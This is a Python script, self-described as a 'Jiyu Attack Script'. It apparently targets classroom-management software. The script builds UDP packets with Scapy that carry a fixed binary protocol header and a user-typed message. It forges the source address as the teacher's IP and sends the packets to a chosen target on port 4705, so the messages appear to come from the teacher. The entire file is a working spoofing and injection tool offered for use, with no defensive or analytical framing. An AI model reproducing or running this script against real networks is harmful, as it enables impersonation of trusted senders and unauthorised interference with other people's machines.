# pylint: disable=line-too-long, invalid-name

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import secrets
import warnings

from typing import Literal, Type

import scapy.all as scapy


def throw_error(
    message: str,
    *,
    error: Type[Exception] = ValueError,
    warning: Type[Warning] = UserWarning,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> None:
    """
    Throws an error or warning based on the specified error handling strategy.

    Args:
        message (str): The error or warning message.
        error (Type[Exception], optional): The exception type to raise if errors are set to "error". Defaults to ValueError.
        warning (Type[Warning], optional): The warning type to issue if errors are set to "warning". Defaults to UserWarning.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Raises:
        error: If errors is set to "error", raises the specified exception.
        warning: If errors is set to "warning", issues a warning of the specified type.
        ValueError: If errors is set to an invalid value.
        None: If errors is set to "ignore", does nothing.
    """
    match errors:
        case "error":
            raise error(message)
        case "warning":
            warnings.warn(message, category=warning, stacklevel=2)
        case "ignore":
            pass
        case _:
            raise ValueError(f"Invalid error handling strategy: {errors}")


def format_msg(
    msg: str,
    *,
    max_length: int = 800,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the resulting byte array. Defaults to 800.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    ret = bytearray()
    for s in msg:
        c = ord(s)
        if c > 0xFFFF:
            throw_error(f"Character {s} (0x{c:X}) is not supported.", errors=errors)
        else:
            ret.append(c & 0xFF)
            ret.append((c >> 8) & 0xFF)
    if len(ret) > max_length:
        throw_error(
            f"Data length exceeds maximum length of {max_length} bytes: {len(ret)} bytes.",
            errors=errors,
        )
    return bytes(ret.ljust(max_length, b"\x00"))[:max_length]


def pkg_message(
    msg: str,
    *,
    errors: Literal["error", "warning", "ignore"] = "error",
) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.
        errors (Literal["error", "warning", "ignore"], optional): Error handling strategy. Defaults to "error".

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.

    Raises:
        ValueError: If the message length exceeds 800 bytes or if the header length is incorrect
    """
    data = format_msg(msg, errors=errors)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    assert len(head) == 56, "Header length must be 56 bytes"
    assert len(data) == 800, "Message length must be 800 bytes"
    return head + data + b"\x00" * 98


def send_packet(src_ip: str, dst_ip: str, dst_port: int, data: bytes) -> None:
    """
    Sends a UDP packet with the specified source IP, destination IP, destination port, and data payload.

    Args:
        src_ip (str): The source IP address.
        dst_ip (str): The destination IP address.
        dst_port (int): The destination port number.
        data (bytes): The data payload to include in the packet.

    Raises:
        scapy.error.Scapy_Exception: If there is an error sending the packet.

    Note:
        This function uses Scapy to construct and send the packet.
        Ensure that Scapy is installed and properly configured in your environment.
    """
    # pylint: disable=no-member
    packet = scapy.IP(src=src_ip, dst=dst_ip) / scapy.UDP(dport=dst_port) / scapy.Raw(load=data)  # type: ignore
    scapy.send(packet, count=1, verbose=False)


if __name__ == "__main__":
    teacher_ip = input("Enter the teacher's IP address: ")
    target = input("Enter the target IP address: ")
    while True:
        tmsg = input("Enter your message (empty to exit): ")
        if not tmsg:
            print("Exiting...")
            break
        payload = pkg_message(tmsg, errors="error")
        send_packet(teacher_ip, target, 4705, payload)
